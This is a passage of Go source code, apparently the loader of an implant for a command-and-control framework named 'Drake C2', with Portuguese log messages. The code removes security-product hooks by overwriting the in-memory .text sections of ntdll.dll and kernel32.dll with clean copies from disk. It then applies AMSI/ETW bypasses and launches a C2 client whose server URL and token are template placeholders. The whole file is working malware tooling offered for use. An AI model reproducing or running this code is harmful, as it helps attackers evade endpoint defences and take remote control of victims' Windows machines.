		return 0, fmt.Errorf("failed to find MapViewOfFile: %v", err)
	}

	ret, _, err := proc.Call(
		hMapping,
		FILE_MAP_READ,
		0,
		0,
		0,
	)
	if ret == 0 {
		return 0, err
	}
	return ret, nil
}

func virtualProtect(addr uintptr, size uint32, newProtect uint32) (uint32, error) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0, fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("VirtualProtect")
	if err != nil {
		return 0, fmt.Errorf("failed to find VirtualProtect: %v", err)
	}

	var oldProtect uint32
	ret, _, err := proc.Call(
		addr,
		uintptr(size),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return 0, err
	}
	return oldProtect, nil
}

func closeHandle(handle uintptr) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("CloseHandle")
	if err != nil {
		return
	}

	proc.Call(handle)
}

func unmapViewOfFile(addr uintptr) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("UnmapViewOfFile")
	if err != nil {
		return
	}

	proc.Call(addr)
}

func copyMemory(dst, src uintptr, size uint32) {
	dstSlice := (*[1 << 30]byte)(unsafe.Pointer(dst))[:size:size]
	srcSlice := (*[1 << 30]byte)(unsafe.Pointer(src))[:size:size]
	copy(dstSlice, srcSlice)
}

func calculateMD5(addr uintptr, size uint32) [16]byte {
	slice := (*[1 << 30]byte)(unsafe.Pointer(addr))[:size:size]
	return md5.Sum(slice)
}

func validateUnhook(moduleAddr, cleanAddr uintptr, size uint32) bool {
	moduleHash := calculateMD5(moduleAddr, size)
	cleanHash := calculateMD5(cleanAddr, size)

	return bytes.Equal(moduleHash[:], cleanHash[:])
}

func unhookModule(moduleName string) bool {
	fmt.Printf("[*] ================================\n")
	fmt.Printf("[*] Iniciando unhook do módulo %s...\n", moduleName)
	fmt.Printf("[*] ================================\n")

	moduleHandle, err := getModuleHandle(moduleName)
	if err != nil {
		fmt.Printf("[-] Falha ao obter handle do módulo %s: %v\n", moduleName, err)
		return false
	}
	fmt.Printf("[+] Handle do módulo obtido: 0x%x\n", moduleHandle)

	currentProcess := getCurrentProcess()
	mi, err := getModuleInformation(currentProcess, moduleHandle)
	if err != nil {
		fmt.Printf("[-] Falha ao obter informações do módulo %s: %v\n", moduleName, err)
		return false
	}
	fmt.Printf("[+] Módulo carregado em: 0x%x, tamanho: 0x%x bytes\n", mi.LpBaseOfDll, mi.SizeOfImage)

	systemPath, err := getSystemDirectory()
	if err != nil {
		fmt.Printf("[-] Falha ao obter diretório do sistema: %v\n", err)
		return false
	}

	dllPath := systemPath + "\\" + moduleName
	fmt.Printf("[+] Caminho da DLL limpa: %s\n", dllPath)

	hFile, err := createFile(dllPath)
	if err != nil {
		fmt.Printf("[-] Falha ao abrir %s no disco: %v\n", dllPath, err)
		return false
	}
	defer closeHandle(hFile)
	fmt.Printf("[+] Arquivo DLL aberto com sucesso\n")

	hMapping, err := createFileMapping(hFile)
	if err != nil {
		fmt.Printf("[-] Falha ao criar mapeamento de %s: %v\n", dllPath, err)
		return false
	}
	defer closeHandle(hMapping)

	mappedAddress, err := mapViewOfFile(hMapping)
	if err != nil {
		fmt.Printf("[-] Falha ao mapear %s na memória: %v\n", dllPath, err)
		return false
	}
	defer unmapViewOfFile(mappedAddress)
	fmt.Printf("[+] DLL mapeada na memória em: 0x%x\n", mappedAddress)

	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(moduleHandle))
	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(moduleHandle + uintptr(dosHeader.E_lfanew)))

	mappedDosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(mappedAddress))
	mappedNtHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(mappedAddress + uintptr(mappedDosHeader.E_lfanew)))

	if dosHeader.E_magic != 0x5A4D || mappedDosHeader.E_magic != 0x5A4D {
		fmt.Printf("[-] Headers DOS inválidos\n")
		return false
	}

	if ntHeader.Signature != 0x00004550 || mappedNtHeader.Signature != 0x00004550 {
		fmt.Printf("[-] Headers NT inválidos\n")
		return false
	}

	fmt.Printf("[+] Headers validados com sucesso\n")
	numberOfSections := ntHeader.FileHeader.NumberOfSections

	optionalHeaderSize := uintptr(ntHeader.FileHeader.SizeOfOptionalHeader)
	firstSectionAddr := moduleHandle + uintptr(dosHeader.E_lfanew) +
		unsafe.Sizeof(ntHeader.Signature) + unsafe.Sizeof(ntHeader.FileHeader) + optionalHeaderSize

	mappedFirstSectionAddr := mappedAddress + uintptr(mappedDosHeader.E_lfanew) +
		unsafe.Sizeof(mappedNtHeader.Signature) + unsafe.Sizeof(mappedNtHeader.FileHeader) +
		uintptr(mappedNtHeader.FileHeader.SizeOfOptionalHeader)

	fmt.Printf("[*] Processando %d seções...\n", numberOfSections)

	unhookSuccess := false

	for i := uint16(0); i < numberOfSections; i++ {
		sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(firstSectionAddr + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{})))
		mappedSectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(mappedFirstSectionAddr + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{})))
		sectionName := ""
		for j := 0; j < 8; j++ {
			if sectionHeader.Name[j] == 0 {
				break
			}
			sectionName += string(sectionHeader.Name[j])
		}

		fmt.Printf("[*] Processando seção: '%s' (tamanho: 0x%x)\n", sectionName, sectionHeader.VirtualSize)
		if sectionName == ".text" {
			fmt.Printf("[+] Seção .text encontrada!\n")

			moduleTextSectionAddress := moduleHandle + uintptr(sectionHeader.VirtualAddress)
			cleanTextSectionAddress := mappedAddress + uintptr(mappedSectionHeader.VirtualAddress)

			fmt.Printf("[*] Endereço seção .text no módulo: 0x%x\n", moduleTextSectionAddress)
			fmt.Printf("[*] Endereço seção .text limpa: 0x%x\n", cleanTextSectionAddress)

			beforeHash := calculateMD5(moduleTextSectionAddress, sectionHeader.VirtualSize)
			cleanHash := calculateMD5(cleanTextSectionAddress, mappedSectionHeader.VirtualSize)

			fmt.Printf("[*] Hash seção atual: %x\n", beforeHash)
			fmt.Printf("[*] Hash seção limpa: %x\n", cleanHash)

			if bytes.Equal(beforeHash[:], cleanHash[:]) {
				fmt.Printf("[+] Seção já está limpa (hashes idênticos)\n")
				unhookSuccess = true
			} else {
				fmt.Printf("[!] Seção modificada detectada - prosseguindo com unhook\n")

				oldProtect, err := virtualProtect(moduleTextSectionAddress, sectionHeader.VirtualSize, PAGE_EXECUTE_READWRITE)
				if err != nil {
					fmt.Printf("[-] Falha ao alterar proteção de memória da seção .text em %s: %v\n", moduleName, err)
					continue
				}
				fmt.Printf("[+] Proteção de memória alterada (antes: 0x%x)\n", oldProtect)

				fmt.Printf("[*] Copiando %d bytes da seção limpa...\n", sectionHeader.VirtualSize)
				copyMemory(moduleTextSectionAddress, cleanTextSectionAddress, sectionHeader.VirtualSize)

				_, err = virtualProtect(moduleTextSectionAddress, sectionHeader.VirtualSize, oldProtect)
				if err != nil {
					fmt.Printf("[-] Falha ao restaurar proteção de memória da seção .text em %s: %v\n", moduleName, err)
				} else {
					fmt.Printf("[+] Proteção de memória restaurada\n")
				}

				if validateUnhook(moduleTextSectionAddress, cleanTextSectionAddress, sectionHeader.VirtualSize) {
					fmt.Printf("[+] ✓ Unhook validado com sucesso!\n")
					unhookSuccess = true
				} else {
					fmt.Printf("[-] ✗ Falha na validação do unhook\n")
				}
			}

			break
		}
	}
	if !unhookSuccess {
		fmt.Printf("[-] Nenhuma seção .text foi processada com sucesso\n")
		return false
	}

	fmt.Printf("[*] ================================\n")
	fmt.Printf("[+] Unhook de %s concluído com sucesso!\n", moduleName)
	fmt.Printf("[*] ================================\n")
	return true
}

func main() {

	//fmt.Scanln()

	fmt.Println("=== DRAKE C2 - DLL UNHOOKING ===")
	fmt.Println("[*] Iniciando processo de unhooking avançado...")
	fmt.Println()

	modules := []string{"ntdll.dll", "kernel32.dll"}
	successCount := 0

	for _, module := range modules {
		if unhookModule(module) {
			successCount++
		}
		fmt.Println()
	}

	fmt.Printf("=== RESULTADO FINAL ===\n")
	fmt.Printf("[*] Módulos processados: %d/%d\n", successCount, len(modules))

	if successCount == len(modules) {
		fmt.Printf("[+] Todos os módulos foram processados com sucesso!\n")
	} else if successCount > 0 {
		fmt.Printf("[!] Alguns módulos foram processados com sucesso\n")
	} else {
		fmt.Printf("[-] Nenhum módulo foi processado com sucesso\n")
	}

	fmt.Println("[*] Unhooking concluído.")

	if runtime.GOOS == "windows" {
		fmt.Println("[+] Starting AMSI/ETW Bypass Methods...")
		fmt.Println("[+] Applying BOTH bypass methods simultaneously...")

		fmt.Println("[+] Method 1: Hardware Breakpoint Bypass")
		err1 := setupBypass()
		if err1 != nil {
			fmt.Printf("[-] Hardware Breakpoint Bypass failed: %v\n", err1)
		} else {
			fmt.Println("[+] Hardware Breakpoint Bypass active!")
		}

		fmt.Println("[+] Method 2: Direct Memory Patch Bypass (Main.cpp method)")
		err2 := setupDirectAmsiPatch()
		if err2 != nil {
			fmt.Printf("[-] Direct Memory Patch Bypass failed: %v\n", err2)
		} else {
			fmt.Println("[+] Direct Memory Patch Bypass active!")
		}

		if err1 != nil && err2 != nil {
			fmt.Println("[!] Both bypass methods failed, continuing without bypass...")
		} else if err1 == nil && err2 == nil {
			fmt.Println("[+] SUCCESS: Both bypass methods are active!")
		} else if err1 == nil {
			fmt.Println("[+] SUCCESS: Hardware Breakpoint Bypass is active!")
		} else {
			fmt.Println("[+] SUCCESS: Direct Memory Patch Bypass is active!")
		}

		TsTAmsiBypass()
	} else {
		fmt.Println("[!] Bypass is Windows-only, continuing without it...")
	}

	fmt.Println("[+] Starting Drake C2 client...")
	client := NewClient("URL_REPLACE", "TOKEN_REPLACE", "BUILD_ID_REPLACE")
	if err := client.Run(); err != nil {
		fmt.Printf("[-] Client error: %v\n", err)
		os.Exit(1)
	}
}
